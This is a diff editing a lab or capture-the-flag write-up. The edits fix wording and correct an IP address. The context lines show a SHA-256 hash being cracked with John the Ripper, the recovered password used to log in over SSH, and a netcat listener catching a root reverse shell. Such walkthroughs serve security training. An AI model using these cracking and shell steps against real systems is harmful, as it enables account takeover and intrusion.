@@ -130,7 +130,7 @@ We will use this program to crack the hash we obtained earlier. JohnTheRipper is
 
 This program works by taking a wordlist, hashing it with the specified algorithm and then comparing it to your hashed password. If both hashed passwords are the same, it means it has found it. You cannot reverse a hash, so it needs to be done by comparing hashes.
 
-Let's crack the hash and find the `agent47` password.
+Let's crack the hash to retrieve `agent47`'s password.
 
 ```
 $ echo 'ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14' > hash
@@ -156,7 +156,7 @@ $ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA256
 videogamer124    (?)   
 ```
 
-We have the plaintext password. Let's log into the machine trough SSH
+We have the plaintext password. Let's log into the machine throught SSH
 
 ```
 $ ssh agent47@10.10.128.187
@@ -269,7 +269,7 @@ Immediately after sending the request we can see the connection to our machine
 ```
 $ nc -lvnp 4242
 
-Connection from 10.10.217.19 43114 received!
+Connection from 10.10.128.187 43114 received!
 # whoami
 whoami
 root
